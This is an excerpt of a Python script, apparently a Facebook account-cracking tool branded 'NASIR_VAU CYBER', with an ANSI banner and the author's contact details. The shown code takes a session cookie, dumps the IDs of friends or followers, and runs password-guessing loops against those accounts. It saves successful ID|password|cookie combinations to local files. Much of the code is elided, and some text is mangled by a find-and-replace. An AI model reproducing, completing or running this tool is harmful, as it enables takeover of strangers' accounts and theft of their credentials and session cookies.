...
okc = 'NASIR_VAU OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
...
def back():
	login()
	os.system('xdg-open https://t.me/+iyzCsEvVKWVlN2Vk')
#------------------[ LOGO ]-----------------#
#Logo Add Krlo Nichy Apna
def banner():
	clear()
	sol()
	ban=''' Â©  BANGLADESH NASIR_VAU CYBER
\033[31;1m⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
\033[32;1m⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
\033[33;1m⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
\033[34;1m⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
...
\033[34;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;33m║ \x1b[1;91m║❤︎\033[92;1m[\033[91;1m❥\033[92;1m] ❦𝐓𝐎𝐋𝐋➤➤❦❦❦❦\033[31;1m𝐍𝐀𝐌𝐄➤\033[32;1m❦𝙉𝘼𝙎𝙄𝙍➤
\033[35;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;34m║ \x1b[1;91m║❤︎\033[92;1m[\033[91;1m❥\033[92;1m] ❦𝐀𝐔𝐓𝐇𝐎𝐑➤➤❦❦❦\033[32;1m𝙉𝘼𝙎𝙄𝙍➤\033[33;1m❥𝐂𝐘𝐁𝐄𝐑➤
\033[36;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;35m║ \x1b[1;91m║❤︎\033[92;1m[\033[91;1m❥\033[92;1m] ❦𝐆𝐈𝐓𝐇𝐔𝐁➤➤❦❦❦\033[33;1m𝙉𝘼𝙎𝙄𝙍➤\033[34;1m❥𝙑𝘼𝙄\033[34;1m
\033[37;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;36m║ \x1b[1;91m║❤︎\033[92;1m[\033[91;1m❥\033[92;1m] ❦𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊➤➤❦❦❦\033[34;1m𝙉𝘼𝙎𝙄𝙍➤\033[35;1m❥𝙑𝘼𝙐➤
\033[31;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;37m║ \x1b[1;91m║❤︎\033[92;1m[\033[91;1m❥\033[92;1m] ❦𝐆𝐑𝐔𝐏➤➤❦❦❦\033[35;1m𝙉𝘼𝙎𝙄𝙍➤\033[92;1m❥𝙑𝘼𝙐➤
\033[32;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;31m║ \x1b[1;91m║❤︎\033[92;1m[\033[91;1m❥\033[92;1m] ❦𝐖𝐇𝐀𝐓𝐇𝐀𝐏𝐏➤➤❦❦❦\033[36;1m01783751735➤
\033[33;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;32m║ \x1b[1;91m╚══════════════════════════════╝
\033[34;1m│➤❦❦❦❦❦❦❦❦❦\x1b[1;33m╚══════════════════════════════════╝
\033[35;1m│─────────────────────────────────────────
\033[36;1m╰───────────────────────────────────────────────────────────╯
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}â€¢{u}] INPUT CONASIR_VAU OKIES :{asu} ')
...
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('NASIR_VAU OK')
		except FileNotFoundError:
			print('=>File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('=>Anda Tidak Mempunyai File NASIR_VAU OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('NASIR_VAU OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				exit()
			try:lin = open('NASIR_VAU OK/'+geh,'r').read().splitlines()
			except:
				print('=>File Tidak Di Temukan ')
				time.sleep(2)
				back()
			...
			for cpku in range(len(lin)):
				...
				print(f'{hh}CONASIR_VAU OKIE : {u}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
...
def dump_massal():
	...
	try:
		...
		print(f'âž¥=>{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW CONASIR_VAU OKIE OTHRWSE CHEK YOUR ID LNK {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('=>TYPE ME IF YOU WNT DUMP TNASIR_VAU OKEN ID FRIENDS ')
...
def passwrd():
	...
	print('')
	print(f'=>RESULTS {h}NASIR_VAU OK{u} CHEK : {h}NASIR_VAU OK/%s {b}'%(okc))
	...
	print(f'[{h}â€¢{u}]{h} NASIR_VAU OK : {h}%s '%(ok))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      â¤ï¸âœ¨ WASI-NASIR_VAU OK â¤ï¸âœ¨[green]')) 
				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
				open('NASIR_VAU OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('NASIR_VAU OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s â˜¬ %s/%s â˜¬ NASIR_VAU OK:%s â˜¬ CP:%s â˜¬ %s%s%s â˜¬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/NASIR_VAU OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] CONASIR_VAU OKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='MR SAJJAD NASIR_VAU OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/PINK-DATA/NASIR_VAU OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					print('\n')
					statusok = f'[bold green][â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] CONASIR_VAU OKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MR SAJJAD NASIR_VAU OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] CONASIR_VAU OKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='NASIR_VAU OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> NASIR_VAU OK       %s'%(h,id,pw,x))
			else:
